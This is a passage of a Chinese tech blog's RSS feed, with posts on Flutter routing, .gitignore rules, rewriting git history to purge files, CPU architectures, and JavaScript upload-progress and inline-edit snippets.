&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;newdiv&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setSelectionRange&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;innerHTML&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;//设置光标选中位置
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;newdiv&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;focus&lt;/span&gt;()               &lt;span style=&#34;color:#75715e&#34;&gt;//设置元素获得焦点，失去焦点触发onblur
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;newdiv&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;onblur&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;blur&lt;/span&gt;         &lt;span style=&#34;color:#75715e&#34;&gt;//设置失去焦点事件
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;blur&lt;/span&gt;(){
        &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;innerHTML&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;   &lt;span style=&#34;color:#75715e&#34;&gt;//将文本内容重新赋值给元素
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;newdiv&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;onkeyup&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;){ &lt;span style=&#34;color:#75715e&#34;&gt;//设置回车时执行失去焦点事件
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Enter&amp;#39;&lt;/span&gt;){ &lt;span style=&#34;color:#a6e22e&#34;&gt;newdiv&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;blur&lt;/span&gt;() }
    }
})
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Flutter—路由 initialRoute 与 home 的区别</title>
        <link>https://ac-lm.github.io/posts/flutter/flutter%E8%B7%AF%E7%94%B1-initialroute-%E4%B8%8E-home-%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
        <pubDate>Wed, 18 May 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/flutter/flutter%E8%B7%AF%E7%94%B1-initialroute-%E4%B8%8E-home-%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
        <description>&lt;h2 id=&#34;1优先级&#34;&gt;1.优先级&lt;/h2&gt;
&lt;p&gt;在 MaterialApp 中，initialRoute 和 home 都指向首页，但其优先级不同&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;有 home，无 initialRoute，无 routes，只显示 home&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;有 home，有 initialRoute，无 routes，若 initialRoute 是 &amp;quot; / &amp;ldquo;，则正常显示 home；若不是 &amp;quot; / &amp;ldquo;，则程序会报错，但是仍然能显示 home&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;有 home，无 initialRoute，有 routes，若 routes 包含 &amp;quot; / &amp;ldquo;，则程序会报错；若 routes 不包含 &amp;quot; / &amp;quot; ，则显示 home&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;有 home，有 initialRoute，有 routes，若 routes 包含 &amp;quot; / &amp;ldquo;，则程序会报错；若 routes 不包含 &amp;quot; / &amp;quot; ，则会先显示 home，再显示 initialRoute ，从 initialRoute 可以返回到 home，这个特性可以用来实现启动页&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;无 home，有 initialRoute，有 routes，若 routes 包含 &amp;quot; / &amp;quot; ，则先显示 &amp;quot; / &amp;quot; ，再显示 initialRoute，从 initialRoute 可以返回到 &amp;quot; / &amp;quot; ，这个特性可以用来实现启动页&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;无 home，无 initialRoute，有 routes，若 routes 包含 &amp;quot; / &amp;quot; ，则显示 &amp;quot; / &amp;quot; ；若 routes 不包含 &amp;quot; / &amp;quot; ，则程序会报错&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;无 home，有 initialRoute，无 routes，程序报错&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2总结&#34;&gt;2.总结&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;home 相当于 routes 中的 &amp;quot; / &amp;quot; ，因此当 routes 中有 &amp;quot; / &amp;quot; 时，不能设置 home&lt;/li&gt;
&lt;li&gt;有 initialRoute 必须要有 routes&lt;/li&gt;
&lt;li&gt;home 和 initialRoute 同时存在时，会先显示 home，再显示 initialRoute，可以用来实现启动页&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Git—.gitignore 文件配置</title>
        <link>https://ac-lm.github.io/posts/git/git.gitignore-%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE/</link>
        <pubDate>Wed, 18 May 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/git/git.gitignore-%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE/</guid>
        <description>&lt;h2 id=&#34;1文件语法&#34;&gt;1.文件语法&lt;/h2&gt;
&lt;h3 id=&#34;a忽略指定文件目录&#34;&gt;a.忽略指定文件/目录&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-gitignore&#34; data-lang=&#34;gitignore&#34;&gt;# 忽略指定文件
HelloWrold.class

# 忽略指定文件夹
bin/
bin/gen/
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;b通配符忽略规则&#34;&gt;b.通配符忽略规则&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-gitignore&#34; data-lang=&#34;gitignore&#34;&gt;# 忽略 .class 的所有文件
*.class

# 忽略名称中末尾为 ignore 的文件夹
*ignore/

# 忽略名称中间包含 ignore 的文件夹
*ignore*/
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Git—历史删除</title>
        <link>https://ac-lm.github.io/posts/git/git%E5%8E%86%E5%8F%B2%E5%88%A0%E9%99%A4/</link>
        <pubDate>Wed, 18 May 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/git/git%E5%8E%86%E5%8F%B2%E5%88%A0%E9%99%A4/</guid>
        <description>&lt;h2 id=&#34;1删除特定文件的上传历史&#34;&gt;1.删除特定文件的上传历史&lt;/h2&gt;
&lt;h3 id=&#34;a重写提交记录将历史中的所有指定文件删除&#34;&gt;a.重写提交记录，将历史中的所有指定文件删除&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;git filter-branch --force --index-filter &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;git rm --cached --ignore-unmatch 目标的文件&amp;#39;&lt;/span&gt; --prune-empty --tag-name-filter cat -- --all
git filter-branch --force --index-filter &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;git rm --cached -r --ignore-unmatch 目标的文件夹&amp;#39;&lt;/span&gt; --prune-empty --tag-name-filter cat -- --all
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b删除历史记录&#34;&gt;b.删除历史记录&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;rm -rf .git/refs/original/ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c将历史记录的过期时间设置为此刻放弃所有历史的找回功能&#34;&gt;c.将历史记录的过期时间设置为此刻，放弃所有历史的找回功能&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;git reflog expire --expire&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;now --all
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;d垃圾回收&#34;&gt;d.垃圾回收&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;git gc --aggressive --prune&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;now 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;e强制更新需要注意的是远端仓库需要移除保护限制&#34;&gt;e.强制更新（需要注意的是，远端仓库需要移除保护限制）&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;git push origin --force --all
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—CPU 系统架构</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0cpu-%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/</link>
        <pubDate>Wed, 18 May 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0cpu-%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_34160841/article/details/105744375&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; CPU架构详细介绍_@MasterHu88 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1主流架构&#34;&gt;1.主流架构&lt;/h2&gt;
&lt;p&gt;目前市场上的 CPU 主要分为两大阵营，一个是 intel、AMD 为首的复杂指令集 CPU（ 如 X86 ），另一个是以 IBM、ARM 为首的精简指令集 CPU（ 如 ARM ）&lt;/p&gt;
&lt;h2 id=&#34;2x86&#34;&gt;2.X86&lt;/h2&gt;
&lt;p&gt;X86 又称 IA-32 是指美国 Intel 公司为其第一块 CPU i8086 专门开发的一种 32 位复杂指令集，主要应用于个人计算机、服务器的 CPU 设计中。在 64 位 CPU 系统中 Intel 首先设计出 IA-64，但由于其与 32 位指令集不兼容，因此渐渐被人们所淘汰。&lt;/p&gt;
&lt;p&gt;此时， AMD 公司基于 X86 设计出一个兼容 32 位的 64 位指令集，名字叫做 AMD64 。在后续的使用中，AMD64 逐渐被业界接受，成为了 x86 在 64 位平台的事实标准。&lt;/p&gt;
&lt;p&gt;在 AMD64 被大众接受之后，Intel 不得不兼容这个指令集。而 Intel 为了避嫌，将 AMD64 改为 x86_64，因此，AMD64 与 X86_64 本质上是同一个东西。&lt;/p&gt;
&lt;h2 id=&#34;3arm&#34;&gt;3.ARM&lt;/h2&gt;
&lt;p&gt;ARM 架构，也称作进阶精简指令集机器（Advanced RISC Machine，更早称作：Acorn RISC Machine），是一个 32 位精简指令集（RISC）处理器架构，其广泛地使用在许多嵌入式系统设计。由于节能的特点，ARM 处理器非常适用于行动通讯领域，符合其主要设计目标为低耗电的特性。目前 ARM 主要市场是手机端 CPU 和 MCU，手机 CPU 市场，由高通骁龙系列、华为麒麟系列、苹果的 M1 系列以及三星猎户系列和联发科系列，在MCU端主要是 STM32 以及国产的 GD32。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Web开发—上传进度获取</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E4%B8%8A%E4%BC%A0%E8%BF%9B%E5%BA%A6%E8%8E%B7%E5%8F%96/</link>
        <pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E4%B8%8A%E4%BC%A0%E8%BF%9B%E5%BA%A6%E8%8E%B7%E5%8F%96/</guid>
        <description>&lt;h2 id=&#34;1javascript-的-xmlhttprequestprogress-事件&#34;&gt;1.javascript 的 XMLHttpRequest:progress 事件&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;formData&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FormData&lt;/span&gt;(); 
&lt;span style=&#34;color:#a6e22e&#34;&gt;formData&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;files&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]); 
&lt;span style=&#34;color:#a6e22e&#34;&gt;formData&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;token&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;token_value&lt;/span&gt;);

&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XMLHttpRequest&lt;/span&gt;();
&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/uploadurl&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#75715e&#34;&gt;// 上传完成后的回调函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;onload&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; () {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;) {
　　&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;上传成功&amp;#39;&lt;/span&gt;);
  } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
  　&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;上传出错&amp;#39;&lt;/span&gt;);
  }
};
&lt;span style=&#34;color:#75715e&#34;&gt;// 获取上传进度
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;upload&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;onprogress&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;lengthComputable&lt;/span&gt;) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;percent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Math.&lt;span style=&#34;color:#a6e22e&#34;&gt;floor&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;loaded&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;event&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;total&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;) ;
    &lt;span style=&#34;color:#75715e&#34;&gt;// 设置进度显示
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#J_upload_progress&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;progress&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;set progress&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;percent&lt;/span&gt;);
  }
};
&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;formData&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2jquery-封装的-xhr&#34;&gt;2.jQuery 封装的 xhr&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;formData&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FormData&lt;/span&gt;(); 
&lt;span style=&#34;color:#a6e22e&#34;&gt;formData&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;, document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;file&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;files&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]); 
&lt;span style=&#34;color:#a6e22e&#34;&gt;formData&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;token&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;token_value&lt;/span&gt;); 

&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ajax&lt;/span&gt;({ 
    &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/uploadurl&amp;#34;&lt;/span&gt;, 
    &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;, 
    &lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;formData&lt;/span&gt;, 
    &lt;span style=&#34;color:#a6e22e&#34;&gt;processData&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;// 不要对data 参数进行序列化处理，默认为 true
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;contentType&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;// 不要设置 Content-Type 请求头，因为文件数据是以 multipart/form-data 来编码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(){
        &lt;span style=&#34;color:#a6e22e&#34;&gt;myXhr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ajaxSettings&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;myXhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;upload&lt;/span&gt;){
          &lt;span style=&#34;color:#a6e22e&#34;&gt;myXhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;upload&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;addEventListener&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;progress&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;lengthComputable&lt;/span&gt;) {
              &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;percent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Math.&lt;span style=&#34;color:#a6e22e&#34;&gt;floor&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;loaded&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;total&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;);
              &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;percent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;) {
                &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#J_progress_bar&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;progress&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;set progress&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;percent&lt;/span&gt;);
                &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#J_progress_label&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;html&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;已上传：&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;percent&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%&amp;#39;&lt;/span&gt;);
              }
              &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;percent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;) {
                &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#J_progress_label&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;html&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;文件上传完毕，请等待...&amp;#39;&lt;/span&gt;);
                &lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;#J_progress_label&amp;#34;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;addClass&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;success&amp;#39;&lt;/span&gt;);
              }
            }
